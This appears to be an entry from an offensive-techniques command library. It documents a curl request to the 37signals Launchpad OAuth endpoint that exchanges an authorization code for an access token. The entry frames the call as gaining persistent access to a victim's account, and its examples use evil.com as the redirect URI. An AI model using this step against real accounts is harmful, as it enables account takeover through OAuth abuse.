---
id: cmd-37signals-post-token-001
data: >-
  curl -X POST https://launchpad.37signals.com/authorization/token -H
  "Content-Type: application/x-www-form-urlencoded" -d
  "type=web_server&client_id={your-client-id}&redirect_uri={your-redirect-uri}&client_secret={your-client-secret}&code={authorization-code}"
tags:
  - oauth2
  - token-exchange
  - http-post
type: command
output: '{"access_token":"token-value","token_type":"bearer"}'
executor: curl
platforms:
  - Web
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:30:07.299Z'
verified: false
validated: true
submitted: true
---
# post-authorization-token

## Command

```bash
curl -X POST https://launchpad.37signals.com/authorization/token \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "type=web_server&client_id={your-client-id}&redirect_uri={your-redirect-uri}&client_secret={your-client-secret}&code={authorization-code}"
```

## Description

Exchanges the obtained authorization code for an access token to gain persistent API access to the victim's account.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| type | OAuth flow type (web_server) | Yes |
| client_id | The client ID of the third-party application | Yes |
| redirect_uri | Callback URL used in authorization | Yes |
| client_secret | Secret key for the client | Yes |
| code | Authorization code from previous step | Yes |

## Examples

### Basic Usage

```bash
curl -X POST https://launchpad.37signals.com/authorization/token \
  -d "type=web_server&client_id=abc123&redirect_uri=https://evil.com/callback&client_secret=secret&code=xyz789"
```

### Advanced Usage

With verbose output:

```bash
curl -v -X POST https://launchpad.37signals.com/authorization/token \
  -d "type=web_server&client_id=abc123&redirect_uri=https://evil.com/callback&client_secret=secret&code=xyz789"
```

## Expected Output

JSON response with access_token, e.g., {"access_token":"abc123def","token_type":"bearer"}.

## Related

- [[commands/post-authorization-json]]
- [[procedures/Exchange-Code-for-Access-Token]]
